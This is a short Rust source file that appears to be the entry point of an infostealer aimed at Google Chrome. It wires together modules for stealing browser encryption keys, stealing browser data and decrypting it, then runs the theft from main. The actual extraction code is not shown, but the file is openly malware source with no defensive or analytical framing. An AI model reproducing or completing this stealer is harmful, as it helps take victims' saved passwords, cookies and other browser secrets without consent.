mod stealer;
mod key_stealers;
mod data_stealers;
mod decryptors;

// Function to steal data from Google Chrome
fn steal_google_chrome() {
    let stealer = stealer::Stealer::new(
        Box::new(key_stealers::ChromeKeyStealer::new()),
        Box::new(data_stealers::ChromeDataStealer::new()),
        Box::new(decryptors::ChromeDecryptor::new()),
    );

    stealer.steal();
}

fn main() {
    steal_google_chrome();
}
